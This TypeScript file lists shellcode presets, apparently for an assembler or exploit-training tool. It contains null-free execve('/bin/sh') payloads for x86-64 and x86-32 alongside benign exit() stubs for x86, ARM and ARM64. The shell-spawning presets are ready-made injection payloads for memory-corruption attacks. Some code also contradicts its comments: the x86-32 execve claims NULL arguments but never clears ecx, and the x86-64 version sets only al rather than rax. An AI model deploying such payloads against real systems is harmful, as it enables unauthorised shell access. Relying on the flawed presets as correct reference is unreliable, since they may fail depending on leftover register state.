// Ready-to-load shellcode presets. Size and null-free claims are checked by tests.

export interface Preset {
  id: string;
  label: string;
  arch: string;
  note: string;
  src: string;
}

export const PRESETS: Preset[] = [
  {
    id: 'execve-x64',
    label: 'execve /bin/sh',
    arch: 'x86-64',
    note: '25 B · null-free',
    src: `; execve("//bin/sh", NULL, NULL) — x86-64, null-free
; "//bin/sh" (8 chars) keeps the imm64 free of null bytes —
; a plain "/bin/sh" immediate would encode a leading 00
xor rdx, rdx
push rdx
mov rbx, 0x68732f6e69622f2f
push rbx
push rsp
pop rdi
push rdx
push rdi
push rsp
pop rsi
mov al, 59
syscall`,
  },
  {
    id: 'exit-x64',
    label: 'exit(42)',
    arch: 'x86-64',
    note: '16 B',
    src: `; exit(42) — x86-64
mov rdi, 42
mov rax, 60
syscall`,
  },
  {
    id: 'execve-x32',
    label: 'execve /bin/sh',
    arch: 'x86-32',
    note: '20 B · null-free',
    src: `; execve("/bin//sh", NULL, NULL) — x86-32, null-free
xor ebx, ebx
mul ebx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
mov al, 11
int 0x80`,
  },
  {
    id: 'exit-x32',
    label: 'exit(0)',
    arch: 'x86-32',
    note: '6 B',
    src: `; exit(0) — x86-32
xor ebx, ebx
mov al, 1
int 0x80`,
  },
  {
    id: 'exit-arm',
    label: 'exit(0)',
    arch: 'arm',
    note: '12 B',
    src: `; exit(0) — ARM EABI
mov r7, #1
mov r0, #0
svc 0`,
  },
  {
    id: 'exit-arm64',
    label: 'exit_group(0)',
    arch: 'arm64',
    note: '12 B',
    src: `; exit_group(0) — ARM64
mov x8, #94
mov x0, #0
svc 0`,
  },
];
